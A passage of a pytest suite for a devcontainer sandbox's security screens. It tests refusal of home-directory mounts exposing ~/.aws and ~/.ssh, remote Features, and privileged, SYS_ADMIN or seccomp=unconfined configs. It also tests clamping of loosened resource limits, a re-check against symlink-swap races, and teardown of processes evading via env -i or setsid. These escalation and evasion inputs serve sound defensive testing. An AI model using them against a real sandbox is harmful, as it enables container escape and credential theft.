        assert await _Stub(ACP_BACKEND_KIRO)._maybe_devcontainer_info() is not None
        assert called == ["/proj"]

    @pytest.mark.asyncio
    async def test_the_client_spawn_path_is_gated_too(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """AcpClient carries its own copy of the seam, so it needs its own
        behavioural check.

        Asserting only that the module MENTIONS the capability set is not enough:
        deleting the guard leaves the import behind, so a source-substring test
        passes while the gate is gone. Verified by mutation.
        """
        from kiro_crew.acp import client as cl
        from kiro_crew.acp.types import ACP_BACKEND_CLAUDE, ACP_BACKEND_KIRO

        called: list[str] = []

        async def _resolver(work_dir: object) -> tuple[object, object]:
            called.append(str(work_dir))
            return object(), None

        monkeypatch.setattr("kiro_crew.devcontainer.resolve_with_locus", _resolver, raising=False)

        class _Stub:
            _work_dir = "/proj"

            def __init__(self, backend: str) -> None:
                self.backend = backend

            _maybe_devcontainer_info = cl.AcpClient._maybe_devcontainer_info

        assert await _Stub(ACP_BACKEND_CLAUDE)._maybe_devcontainer_info() is None
        assert called == [], "the resolver must not run for a non-kiro backend"
        assert await _Stub(ACP_BACKEND_KIRO)._maybe_devcontainer_info() is not None
        assert called == ["/proj"]


class TestSensitiveProjectDirsAreRefused:
    """The workspace bind is implicit, so it is screened by refusing the project.

    Every other mount screen reads what the config DECLARES. The CLI mounts
    ``--workspace-folder`` regardless, so a project rooted at the home directory
    hands over ``~/.aws``, ``~/.ssh`` and Kiro Crew's keystone through a bind that
    appears in no config and no screen could see.
    """

    @staticmethod
    def _write_cfg(project: Path) -> None:
        dc = project / ".devcontainer"
        dc.mkdir(parents=True, exist_ok=True)
        (dc / "devcontainer.json").write_bytes(json.dumps({"image": "x"}).encode())

    def test_a_project_inside_a_protected_location_is_refused(self, tmp_path: Path) -> None:
        aws = Path(os.path.expanduser("~")) / ".aws"
        with pytest.raises(devc.DevcontainerError, match="sandbox withholds"):
            devc.assert_project_dir_mountable(aws / "someproject")

    def test_a_project_that_CONTAINS_a_protected_location_is_refused(self) -> None:
        """Both directions, as with the bind screen: ``is_sensitive_path`` answers
        'is this inside a protected location', which the home directory itself
        passes -- yet mounting it delivers every protected tree under it."""
        with pytest.raises(devc.DevcontainerError, match="sandbox withholds"):
            devc.assert_project_dir_mountable(os.path.expanduser("~"))

    def test_an_ordinary_project_is_accepted(self, tmp_path: Path) -> None:
        """Acceptance case: the refusal must not reject a normal checkout."""
        project = tmp_path / "proj"
        project.mkdir()
        devc.assert_project_dir_mountable(project)

    def test_the_refusal_reaches_the_digest_gate(self, tmp_path: Path) -> None:
        """Wired into the shared screen, not only into up(): a config that can
        never be built safely must not be offered at the trust prompt either."""
        import inspect

        src = inspect.getsource(devc.assert_no_sensitive_host_mounts)
        assert "assert_project_dir_mountable" in src


class TestProjectLimitsAreClampedToTheCeiling:
    """A ceiling a project config can RAISE is not a ceiling.

    These caps stand in for the host cgroup scope, so an enormous positive value
    (``--pids-limit=100000000``) opted out of the protection entirely while reading
    as "the project chose a limit". A stricter project value is still honored --
    that is the legitimate case and the reason the presence check existed.
    """

    @staticmethod
    def _caps(monkeypatch: pytest.MonkeyPatch, run_args: list[str]) -> list[str]:
        import kiro_crew.sandbox as sb

        monkeypatch.setattr(sb, "_cgroup_limits_from_config", lambda: (512, 2048, 50, 0))
        parsed: dict = {"image": "x", "runArgs": list(run_args)}
        devc._apply_default_resource_caps(parsed)
        return parsed["runArgs"]

    def test_a_looser_pids_limit_is_clamped(self, monkeypatch: pytest.MonkeyPatch) -> None:
        args = self._caps(monkeypatch, ["--pids-limit=100000000"])
        # docker takes the LAST occurrence, so the invariant is ordering, not
        # position: the clamp must appear AFTER the project's own value. Asserting
        # on args[-2:] would be wrong -- the CPU flags are appended after it.
        assert "--pids-limit" in args, args
        assert args[args.index("--pids-limit") + 1] == "512", args
        assert args.index("--pids-limit") > args.index("--pids-limit=100000000"), args

    def test_a_stricter_pids_limit_is_honored(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """The parity intent survives: a project asking for a TIGHTER box gets it."""
        args = self._caps(monkeypatch, ["--pids-limit=64"])
        assert "--pids-limit" not in args, args
        assert "--pids-limit=64" in args

    def test_a_looser_memory_limit_is_clamped(self, monkeypatch: pytest.MonkeyPatch) -> None:
        args = self._caps(monkeypatch, ["--memory=64g"])
        assert "--memory" in args
        assert args[args.index("--memory") + 1] == "2048m"

    def test_a_stricter_memory_limit_is_honored(self, monkeypatch: pytest.MonkeyPatch) -> None:
        args = self._caps(monkeypatch, ["--memory=256m"])
        assert "--memory" not in args, args

    @pytest.mark.parametrize(
        ("text", "expected"),
        [
            ("512m", 512 * 1024**2),
            ("2g", 2 * 1024**3),
            ("1048576", 1048576),
            ("2GB", 2 * 1024**3),
            ("nonsense", None),
            ("", None),
        ],
        ids=["mb", "gb", "bare", "uppercase-gb", "unparseable", "empty"],
    )
    def test_size_parsing(self, text: str, expected: object) -> None:
        """An unparseable size returns None so the caller leaves it alone --
        replacing a value the reviewer approved on a parse failure would be a
        silent behaviour change."""
        assert devc._parse_byte_size(text) == expected

    def test_compose_limits_are_clamped_the_same_way(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Compose is a different spelling of the same request, so leaving it on
        inject-if-absent would let the identical opt-out through."""
        import yaml as y

        import kiro_crew.sandbox as sb

        monkeypatch.setattr(sb, "_cgroup_limits_from_config", lambda: (512, 2048, 50, 0))
        out = devc._compose_hardened(
            y.safe_dump(
                {"services": {"app": {"image": "alpine", "pids_limit": 999999, "mem_limit": "64g"}}}
            ).encode(),
            "/base",
        )
        svc = y.safe_load(out.decode())["services"]["app"]
        assert svc["pids_limit"] == 512
        assert svc["mem_limit"] == "2048m"

    def test_compose_swap_cannot_exceed_the_memory_ceiling(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Swap is settled after mem_limit so it can never end up looser than the
        memory ceiling it mirrors -- otherwise the effective bound is doubled."""
        import yaml as y

        import kiro_crew.sandbox as sb

        monkeypatch.setattr(sb, "_cgroup_limits_from_config", lambda: (512, 2048, 50, 0))
        out = devc._compose_hardened(
            y.safe_dump(
                {"services": {"app": {"image": "alpine", "memswap_limit": "128g"}}}
            ).encode(),
            "/base",
        )
        svc = y.safe_load(out.decode())["services"]["app"]
        assert svc["memswap_limit"] == svc["mem_limit"]


class TestFeaturesAreRefused:
    """A Feature's metadata is remote, merged, and outside every screen here.

    The CLI resolves a Feature from a registry at build time and merges its
    metadata into the effective config -- and that metadata can declare
    ``privileged``, ``capAdd``, ``mounts`` or ``containerEnv``. So the local text
    passes every screen in this module while the container that gets built carries
    exactly what those screens exist to refuse.

    The trust grant cannot cover it either: the digest binds the local tree, while
    the Feature's contents are whatever the registry serves later, so the
    exact-bytes consent at the trust prompt would describe text that is not what
    runs.
    """

    @pytest.mark.parametrize(
        "features",
        [
            {"ghcr.io/devcontainers/features/node:1": {"version": "20"}},
            {"ghcr.io/devcontainers/features/docker-in-docker:2": {}},
            ["ghcr.io/devcontainers/features/git:1"],
        ],
        ids=["object-form", "empty-options", "array-form"],
    )
    def test_declared_features_are_refused(self, features: object) -> None:
        """Both schema spellings, since a config using the array form would
        otherwise slip past a check written only for the object form."""
        with pytest.raises(devc.DevcontainerError, match="declares features"):
            devc.assert_no_unscreened_features({"image": "x", "features": features})

    @pytest.mark.parametrize(
        "features", [None, {}, []], ids=["absent", "empty-object", "empty-array"]
    )
    def test_an_empty_features_key_is_accepted(self, features: object) -> None:
        """An empty `features` resolves nothing, so it is not a refusal -- and
        refusing it would reject configs that merely carry the key."""
        cfg: dict = {"image": "x"}
        if features is not None:
            cfg["features"] = features
        devc.assert_no_unscreened_features(cfg)

    def test_the_refusal_names_the_features_it_found(self) -> None:
        """The message has to say WHICH feature to remove -- a bare refusal on a
        multi-feature config leaves the user guessing."""
        with pytest.raises(devc.DevcontainerError, match="node"):
            devc.assert_no_unscreened_features(
                {"image": "x", "features": {"ghcr.io/devcontainers/features/node:1": {}}}
            )

    def test_the_refusal_is_reached_through_the_shared_screen(self) -> None:
        """Wired where the other screens run, so it also gates the trust prompt."""
        import inspect

        assert "assert_no_unscreened_features" in inspect.getsource(
            devc.assert_no_sensitive_host_mounts
        )


class TestTreeEntryCountIsBounded:
    """The byte caps cannot bound the ENTRY count, because directories are free.

    Directories are skipped before any byte accounting, so a tree of empty
    directories weighs nothing the per-file and total-byte caps measure -- while
    ``sorted(rglob())`` still has to hold a Path per entry before the loop starts.
    """

    def test_a_tree_over_the_entry_cap_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(devc, "_MAX_TREE_ENTRIES", 8)
        dc = tmp_path / ".devcontainer"
        dc.mkdir()
        (dc / "devcontainer.json").write_text("{}")
        # Empty DIRECTORIES specifically: they cost zero bytes, so this refusal
        # cannot be coming from the byte caps.
        for i in range(12):
            (dc / f"d{i}").mkdir()
        with pytest.raises(devc.DevcontainerError, match="more than 8 entries"):
            devc._read_config_tree(dc / "devcontainer.json")

    def test_an_ordinary_tree_is_accepted(self, tmp_path: Path) -> None:
        dc = tmp_path / ".devcontainer"
        dc.mkdir()
        (dc / "devcontainer.json").write_text('{"image": "x"}')
        (dc / "Dockerfile").write_text("FROM alpine\n")
        names = [n for n, _ in devc._read_config_tree(dc / "devcontainer.json")]
        assert sorted(names) == ["Dockerfile", "devcontainer.json"]

    def test_the_walk_does_not_sort_the_raw_generator(self) -> None:
        """The cap is worthless if the sort still materializes everything first:
        sorted() must be applied to the bounded list, not to rglob() itself."""
        import inspect

        src = inspect.getsource(devc._read_config_tree)
        assert 'sorted(parent.rglob("*"))' not in src
        assert "sorted(candidates)" in src

    def test_the_digest_is_still_order_independent(self, tmp_path: Path) -> None:
        """Sorting cannot be dropped, only moved: the digest depends on it, so two
        trees with identical content must still hash the same regardless of the
        order the filesystem yields entries in."""
        digests = []
        for run in range(2):
            root = tmp_path / f"r{run}"
            dc = root / ".devcontainer"
            dc.mkdir(parents=True)
            (dc / "devcontainer.json").write_text('{"image": "x"}')
            (dc / "a.sh").write_text("a")
            (dc / "b.sh").write_text("b")
            digests.append(devc.config_digest(dc / "devcontainer.json"))
        assert digests[0] == digests[1]


class TestSwapIsClampedIndependentlyOfMemory:
    """A stricter project memory limit is honored, which left swap unbounded.

    Swap used to be written only when the memory cap was clamped or absent, so
    `--memory 256m --memory-swap -1` fired neither branch: 256m of RAM with
    unlimited swap, which is the ceiling this is supposed to enforce, doubled and
    then some.
    """

    @staticmethod
    def _caps(monkeypatch: pytest.MonkeyPatch, run_args: list[str]) -> list[str]:
        import kiro_crew.sandbox as sb

        monkeypatch.setattr(sb, "_cgroup_limits_from_config", lambda: (512, 2048, 50, 0))
        parsed: dict = {"image": "x", "runArgs": list(run_args)}
        devc._apply_default_resource_caps(parsed)
        return parsed["runArgs"]

    @staticmethod
    def _last(args: list[str], flag: str) -> str | None:
        val = None
        for i, a in enumerate(args):
            if a == flag and i + 1 < len(args):
                val = args[i + 1]
            elif a.startswith(flag + "="):
                val = a.split("=", 1)[1]
        return val

    @pytest.mark.parametrize("unlimited", ["-1", "0"], ids=["minus-one", "zero"])
    def test_unlimited_swap_is_clamped_under_a_stricter_memory_limit(
        self, monkeypatch: pytest.MonkeyPatch, unlimited: str
    ) -> None:
        """The exact case that got through: memory is stricter than the ceiling so
        it is honored, and swap must still be bounded to it."""
        args = self._caps(monkeypatch, ["--memory=256m", f"--memory-swap={unlimited}"])
        assert self._last(args, "--memory-swap") == "256m", args

    def test_swap_is_clamped_to_the_ceiling_when_memory_is_clamped(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        args = self._caps(monkeypatch, ["--memory=64g", "--memory-swap=-1"])
        assert self._last(args, "--memory") == "2048m", args
        assert self._last(args, "--memory-swap") == "2048m", args

    def test_a_stricter_swap_value_is_left_alone(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Swap tighter than memory is a legitimate choice, not a bypass."""
        args = self._caps(monkeypatch, ["--memory=256m", "--memory-swap=128m"])
        assert self._last(args, "--memory-swap") == "128m", args

    def test_swap_is_denied_when_neither_is_declared(self, monkeypatch: pytest.MonkeyPatch) -> None:
        args = self._caps(monkeypatch, [])
        assert self._last(args, "--memory") == "2048m", args
        assert self._last(args, "--memory-swap") == "2048m", args


class TestOpenedDescriptorIsRescreened:
    """The screens run on a path; the open resolves that path a second time.

    ``O_NOFOLLOW`` refuses a symlinked FINAL component and says nothing about the
    intermediate directories, so swapping one between the two resolutions leaves
    the descriptor pointing at a file the containment and sensitivity screens never
    saw -- and these bytes reach both the trust preview and the image build.

    A real race cannot be scheduled deterministically in a test, so the swap is
    simulated at its observable consequence: what the descriptor resolves to.
    """

    @staticmethod
    def _cfg(tmp_path: Path) -> Path:
        dc = tmp_path / "proj" / ".devcontainer"
        dc.mkdir(parents=True)
        cfg = dc / "devcontainer.json"
        cfg.write_text('{"image": "x"}')
        return cfg

    def test_a_descriptor_resolving_outside_the_project_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        cfg = self._cfg(tmp_path)
        outside = tmp_path / "elsewhere" / "devcontainer.json"
        outside.parent.mkdir()
        outside.write_text("{}")

        real_readlink = os.readlink

        def fake_readlink(path: str, *a: object, **k: object) -> str:
            if str(path).startswith("/proc/self/fd/"):
                return str(outside)
            return real_readlink(path, *a, **k)  # type: ignore[arg-type]

        monkeypatch.setattr(os, "readlink", fake_readlink)
        with pytest.raises(devc.DevcontainerError, match="resolved outside the project"):
            devc._read_config_bytes(cfg, str(tmp_path / "proj"))

    def test_a_descriptor_resolving_to_a_sensitive_path_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Containment alone is not enough: a swapped intermediate directory can
        lead to protected material that is still under the project root.

        The sensitivity list is anchored on the real home directory, so rather than
        plant a fake credential store outside it (which the list would not match)
        this asserts the branch itself: the helper consults the sensitivity screen
        on the descriptor's path and refuses on a hit. Real-path containment is
        covered by the test above, which patches nothing but the resolution.
        """
        import kiro_crew.security as sec

        cfg = self._cfg(tmp_path)
        root = tmp_path / "proj"
        planted = root / ".devcontainer" / "swapped.json"

        real_readlink = os.readlink

        def fake_readlink(path: str, *a: object, **k: object) -> str:
            if str(path).startswith("/proc/self/fd/"):
                return str(planted)
            return real_readlink(path, *a, **k)  # type: ignore[arg-type]

        monkeypatch.setattr(os, "readlink", fake_readlink)
        monkeypatch.setattr(
            sec, "is_sensitive_path", lambda p, base_dir=None: str(p) == str(planted)
        )
        with pytest.raises(devc.DevcontainerError, match="sensitive path once opened"):
            devc._read_config_bytes(cfg, str(root))

    def test_a_replaced_file_is_refused_rather_than_parsed(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A deleted-and-replaced file resolves as "<path> (deleted)". Stripping
        that suffix to keep going would be reading the very file that was swapped
        out, so it is a refusal."""
        cfg = self._cfg(tmp_path)
        real_readlink = os.readlink

        def fake_readlink(path: str, *a: object, **k: object) -> str:
            if str(path).startswith("/proc/self/fd/"):
                return f"{cfg} (deleted)"
            return real_readlink(path, *a, **k)  # type: ignore[arg-type]

        monkeypatch.setattr(os, "readlink", fake_readlink)
        with pytest.raises(devc.DevcontainerError, match="replaced while it was being opened"):
            devc._read_config_bytes(cfg, str(tmp_path / "proj"))

    def test_an_unswapped_read_still_succeeds(self, tmp_path: Path) -> None:
        """The screen must not reject the ordinary case -- this is the control."""
        cfg = self._cfg(tmp_path)
        assert devc._read_config_bytes(cfg, str(tmp_path / "proj")) == b'{"image": "x"}'

    def test_the_identity_fallback_refuses_a_mismatch(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Where /proc is unavailable the check degrades to identity. Exercised
        because that is the branch a non-Linux caller would take, and an untested
        fallback is the same as no fallback."""
        cfg = self._cfg(tmp_path)
        other = tmp_path / "proj" / ".devcontainer" / "other.json"
        other.write_text("{}")

        def no_proc(path: str, *a: object, **k: object) -> str:
            raise OSError("no /proc here")

        monkeypatch.setattr(os, "readlink", no_proc)
        # os.stat reports a DIFFERENT inode than the descriptor holds, which is
        # exactly what a completed swap looks like.
        real_stat = os.stat
        monkeypatch.setattr(
            os, "stat", lambda p, *a, **k: real_stat(other) if str(p) == str(cfg) else real_stat(p)
        )
        with pytest.raises(devc.DevcontainerError, match="changed identity"):
            devc._read_config_bytes(cfg, str(tmp_path / "proj"))

    def test_the_identity_fallback_accepts_a_match(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        cfg = self._cfg(tmp_path)

        def no_proc(path: str, *a: object, **k: object) -> str:
            raise OSError("no /proc here")

        monkeypatch.setattr(os, "readlink", no_proc)
        assert devc._read_config_bytes(cfg, str(tmp_path / "proj")) == b'{"image": "x"}'

    def test_the_rescreen_runs_before_any_read(self) -> None:
        """Ordering is the whole point: re-screening after the read would have
        already loaded the swapped bytes into memory and into the caller."""
        import inspect

        src = inspect.getsource(devc._read_config_bytes)
        assert "_assert_fd_still_contained" in src
        # The read goes through os.fdopen, so that is the line the re-screen has
        # to precede.
        assert src.index("_assert_fd_still_contained") < src.index("os.fdopen")


def _captured_kill_script(exec_id: str) -> str:
    """The exact script kill_exec would send into the container."""
    captured: dict = {}

    async def fake_exec(*argv: object, **kw: object) -> object:
        captured["argv"] = argv

        class _P:
            returncode = 0

            async def communicate(self) -> tuple[bytes, bytes]:
                return (b"", b"")

            async def wait(self) -> int:
                return 0

            def kill(self) -> None:
                pass

        return _P()

    info = devc.DevcontainerInfo(
        container_id="c" * 64,
        remote_workspace_folder="/w",
        remote_user="dev",
        project_dir="/w",
        config_digest="d" * 64,
        created_at=0.0,
    )
    with patch.object(asyncio, "create_subprocess_exec", fake_exec):
        asyncio.run(devc.DevcontainerManager().kill_exec(info, exec_id))
    argv = captured["argv"]
    return argv[argv.index("-c") + 1]


def _run_script_selecting(script: str, proc_root: Path) -> set[int]:
    """Run *script* against a synthetic /proc, reporting the pids it would kill.

    The kill verbs are replaced by an echo, and the substitution is ASSERTED: a
    silent miss would run the real signals against this host's pids.
    """
    safe = re.sub(r'kill -(?:TERM|KILL) -?"\$P"', 'echo "SELECTED $P"', script)
    safe = safe.replace("/proc/", f"{proc_root}/").replace("sleep 2; ", "")
    assert "SELECTED" in safe, "kill neutering failed"
    assert "kill -" not in safe, "a kill verb survived neutering"
    out = subprocess.run(["sh", "-c", safe], capture_output=True, text=True, timeout=120).stdout
    return {int(m) for m in re.findall(r"SELECTED (\d+)", out)}


class TestTeardownReachesDescendants:
    """The marker identifies the exec; it does not identify what the exec spawned.

    A process cannot rewrite its OWN environ, so a marked process cannot shed the
    marker -- but a child exec'd with a scrubbed environment (``env -i``) never had
    it, and ``setsid`` moves a child out of the process group the kill targets. So
    both discovery paths missed descendants and agent code outlived teardown.

    Parentage is what survives both evasions, so the kill set is expanded over
    /proc PPID links. Exercised by running the SHIPPED script against a synthetic
    /proc rather than by grepping its text: the script is shell embedded in Python,
    and asserting on its source would pass just as well for a walk that never
    selects anything.
    """

    @staticmethod
    def _fake_proc(root: Path, tree: dict[int, int], marked: dict[int, str]) -> None:
        """Build /proc/<pid>/{stat,environ} for *tree* mapping pid -> ppid."""
        for pid, ppid in tree.items():
            d = root / str(pid)
            d.mkdir(parents=True)
            # "pid (comm) state ppid ..." -- the comm below deliberately contains a
            # space AND a parenthesis, the shape that breaks field-position parsing.
            (d / "stat").write_text(f"{pid} (sh (x) y) S {ppid} 0 0 0\n")
            env = marked.get(pid, "")
            (d / "environ").write_bytes(env.encode() + b"\0" if env else b"\0")

    @pytest.mark.skipif(
        sys.platform.startswith("win") or shutil.which("sh") is None,
        reason="drives the container-side POSIX shell script; no sh on this platform",
    )
    def test_the_shipped_script_selects_descendants(self, tmp_path: Path) -> None:
        exec_id = "ab" * 16
        script = _captured_kill_script(exec_id)

        proc_root = tmp_path / "proc"
        # 100 is the marked exec. 101 scrubbed its env, 102 is a child of 101
        # (grandchild of the root), 103 is unrelated and must NOT be selected.
        self._fake_proc(
            proc_root,
            {1: 0, 100: 1, 101: 100, 102: 101, 103: 1},
            {100: f"{devc.DEVCONTAINER_EXEC_ENV}={exec_id}"},
        )

        selected = _run_script_selecting(script, proc_root)
        assert 100 in selected, f"the marked root was not selected: {selected}"
        assert 101 in selected, f"the env-scrubbed child escaped: {selected}"
        assert 102 in selected, f"the grandchild escaped -- the walk is not transitive: {selected}"
        assert 103 not in selected, f"an unrelated process was selected: {selected}"
        assert 1 not in selected, "PID 1 must never be a target: killing container init"

    @pytest.mark.skipif(
        sys.platform.startswith("win") or shutil.which("sh") is None,
        reason="drives the container-side POSIX shell script; no sh on this platform",
    )
    def test_nothing_is_selected_without_a_marked_process(self, tmp_path: Path) -> None:
        """The control. If the walk selected anything reachable it would tear down
        unrelated processes -- and every assertion above would pass for the wrong
        reason."""
        script = _captured_kill_script("cd" * 16)
        proc_root = tmp_path / "proc"
        self._fake_proc(proc_root, {1: 0, 200: 1, 201: 200}, {})
        assert _run_script_selecting(script, proc_root) == set()

    def test_the_docstring_no_longer_claims_the_marker_is_unevadable(self) -> None:
        """The comment asserted the marker "cannot be spoofed or suppressed from
        inside", which is false for descendants. A security comment claiming a
        property the code does not have is worse than no comment, so its removal is
        asserted rather than left to review."""
        doc = devc.DevcontainerManager.kill_exec.__doc__ or ""
        assert "cannot be spoofed or suppressed" not in doc
        # The residual is named instead.
        assert "double-fork" in doc


class TestStatusPublishesTheDigest:
    """The dashboard needs the config's CONTENT identity, not just its path.

    Its "don't ask me again" dismissal was keyed on the path, so editing the config
    in place left the dismissal in force -- and an edit is what drops trust, so the
    prompt was suppressed at exactly the moment it had to reappear.
    """

    @pytest.mark.asyncio
    async def test_the_digest_is_published_and_matches_the_grant(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        granted = devc.grant_trust(project)

        out = await devc.DevcontainerManager().status(project)
        assert out["config_digest"] == granted
        assert out["trusted"] is True

    @pytest.mark.asyncio
    async def test_the_digest_changes_when_the_config_changes(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The property the dismissal key depends on: same path, different bytes,
        different digest -- otherwise the prompt could never come back."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        before = (await devc.DevcontainerManager().status(project))["config_digest"]

        cfg = project / ".devcontainer" / "devcontainer.json"
        cfg.write_text(json.dumps({"image": "ubuntu:24.04", "name": "edited"}))
        after = await devc.DevcontainerManager().status(project)

        assert after["config_digest"] != before
        assert after["trusted"] is False, "an edit must drop trust"

    @pytest.mark.asyncio
    async def test_an_unhashable_config_reports_no_digest(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Fails closed rather than reporting a partial identity: a config a screen
        refuses can never be trusted, and must not appear to have a digest the
        client could treat as a stable answer."""
        project = tmp_path / "proj"
        project.mkdir()
        dc = project / ".devcontainer"
        dc.mkdir()
        # features are refused, so the digest cannot be computed.
        (dc / "devcontainer.json").write_text(
            json.dumps({"image": "x", "features": {"ghcr.io/devcontainers/features/node:1": {}}})
        )

        out = await devc.DevcontainerManager().status(project)
        assert out["has_config"] is True
        assert out["config_digest"] is None
        assert out["trusted"] is False

    def test_trust_state_and_is_trusted_cannot_disagree(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """is_trusted delegates, so there is one implementation of the rule. Two
        copies is how the trusted/digest pair drifts apart."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        assert devc.trust_state(project)[0] is devc.is_trusted(project) is False
        devc.grant_trust(project)
        assert devc.trust_state(project)[0] is devc.is_trusted(project) is True


class TestPrivilegeFormsBeyondRunArgs:
    """The screen matched a VALUE where it should refuse a FIELD.

    ``privileged`` and ``capAdd`` are first-class devcontainer.json properties, so a
    config never has to spell them as runArgs -- reading only runArgs left the
    shortest spelling completely open. Compose had the mirror-image hole: comparing
    ``is True`` while compose resolves ``${PRIVILEGED}`` at up time, so an
    interpolated value read as "not privileged" and then started privileged.
    """

    @pytest.mark.parametrize(
        "cfg",
        [
            {"image": "x", "privileged": True},
            {"image": "x", "capAdd": ["SYS_ADMIN"]},
            {"image": "x", "securityOpt": ["seccomp=unconfined"]},
        ],
        ids=["top-level-privileged", "top-level-capAdd", "top-level-securityOpt"],
    )
    def test_top_level_privilege_properties_are_refused(self, cfg: dict) -> None:
        with pytest.raises(devc.DevcontainerError):
            devc.assert_no_privileged_modes(cfg)

    def test_a_config_with_no_runArgs_is_still_screened(self) -> None:
        """The specific regression: the function read runArgs and returned early
        when absent, so `{"privileged": true}` alone skipped the entire body."""
        with pytest.raises(devc.DevcontainerError, match="privileged"):
            devc.assert_no_privileged_modes({"image": "x", "privileged": True})

    @pytest.mark.parametrize(
        "value", [False, None, [], ""], ids=["false", "null", "empty-list", "empty-string"]
    )
    def test_declining_privilege_is_not_a_refusal(self, value: object) -> None:
        """`"privileged": false` is a config explicitly declining the thing being
        screened for. Refusing it would reject the safest possible spelling."""
        devc.assert_no_privileged_modes({"image": "x", "privileged": value})

    @pytest.mark.parametrize(
        "value",
        ["${PRIVILEGED}", "$PRIVILEGED", "${PRIV:-true}"],
        ids=["braced", "bare", "with-default"],
    )
    def test_unresolved_interpolation_is_refused_not_guessed(self, value: str) -> None:
        """The value is not known until build time, so there is nothing to screen.
        Reading it as "not true" is the failure mode that let it through."""
        with pytest.raises(devc.DevcontainerError, match="unresolved variable"):
            devc.assert_no_privileged_modes({"image": "x", "privileged": value})

    def test_compose_interpolated_privileged_is_refused(self) -> None:
        with pytest.raises(devc.DevcontainerError, match="unresolved variable"):
            devc._assert_compose_service_unprivileged(
                {"image": "alpine", "privileged": "${PRIVILEGED}"}, "app"
            )

    @pytest.mark.parametrize(
        "key",
        ["cap_add", "security_opt", "devices", "device_cgroup_rules"],
        ids=["cap_add", "security_opt", "devices", "device_cgroup_rules"],
    )
    def test_compose_interpolation_is_refused_across_the_family(self, key: str) -> None:
        """Enumerated rather than fixed one at a time: every field in this family
        can carry the same escalation, and each round of this review has found one
        more spelling of it."""
        with pytest.raises(devc.DevcontainerError, match="unresolved variable"):
            devc._assert_compose_service_unprivileged(
                {"image": "alpine", key: ["${SOMETHING}"]}, "app"
            )

    def test_an_ordinary_compose_service_is_accepted(self) -> None:
        """Control: interpolation elsewhere in the service is the project's own
        business and must not be refused."""
        devc._assert_compose_service_unprivileged(
            {"image": "alpine", "environment": ["TOKEN=${TOKEN}"]}, "app"
        )


class TestScreeningRefusalIsAudited:
    """A refusal to grant trust is a permission decision, so it must be recorded.

    The stale-digest branch was audited and every OTHER ``DevcontainerError`` was
    not -- and that is the branch every configuration refusal takes: features,
    privileged modes, a project directory the sandbox withholds, a tree over the
    ceilings. Those denials were invisible to the audit log, which is the one place
    a permission decision is answerable after the fact.
    """

    @pytest.mark.asyncio
    async def test_a_refused_config_is_audited_as_denied(
        self, as_owner: None, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        dc = project / ".devcontainer"
        dc.mkdir()
        # features are refused: registry metadata is merged at build time.
        cfg = dc / "devcontainer.json"
        cfg.write_bytes(
            json.dumps(
                {"image": "x", "features": {"ghcr.io/devcontainers/features/node:1": {}}}
            ).encode()
        )

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": "0" * 64}, str(project))
        )

        assert resp.status == 404
        assert devc.is_trusted(project) is False
        denied = [c for c in sel_recorder.calls if c.get("outcome") == "denied"]
        assert len(denied) == 1, f"the refusal was not audited: {sel_recorder.calls}"
        assert denied[0]["operation"] == "devcontainer_trust.grant"
        # The reason has to be recoverable from the event, not just the response:
        # an audit line saying only "denied" cannot answer why afterwards.
        assert "features" in denied[0].get("error", "")

    @pytest.mark.asyncio
    async def test_a_refused_config_reports_a_refusal_not_a_missing_one(
        self, as_owner: None, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        """``no_devcontainer_config`` told a client the opposite of what happened:
        the config is present and was screened and rejected."""
        project = tmp_path / "proj"
        project.mkdir()
        dc = project / ".devcontainer"
        dc.mkdir()
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"image": "x", "privileged": True}).encode()
        )

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": "0" * 64}, str(project))
        )

        assert resp.status == 404
        assert _body(resp)["code"] == "devcontainer_trust_refused"

    @pytest.mark.asyncio
    async def test_a_genuinely_absent_config_still_says_so(
        self, as_owner: None, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        """The other side of the same distinction -- the original code was right
        about this case and must stay right about it."""
        project = tmp_path / "proj"
        project.mkdir()

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": "0" * 64}, str(project))
        )

        assert resp.status == 404
        assert _body(resp)["code"] == "no_devcontainer_config"


class TestSlotStateIsReadOnTheEventLoop:
    """The split only helps if the HANDLER keeps the dict read on the loop.

    Asserting that ``_slot_project_strings`` does no I/O proves half of it; this
    proves the other half, which a revert-verify caught as untested: moving the
    call back inside ``asyncio.to_thread`` left every other test passing, because
    they exercise the two helpers directly rather than through the endpoint.
    """

    @pytest.mark.asyncio
    async def test_the_dict_is_read_on_the_loop_and_realpath_is_not(
        self, as_owner: None, tmp_path: Path, trust_home: Path
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)

        where: dict[str, str] = {}
        real_strings = devc_handlers._slot_project_strings
        real_set = devc_handlers._realpath_set

        def tracked_strings(state: object) -> list[str]:
            where["strings"] = threading.current_thread().name
            return real_strings(state)

        def tracked_set(paths: list[str]) -> set[str]:
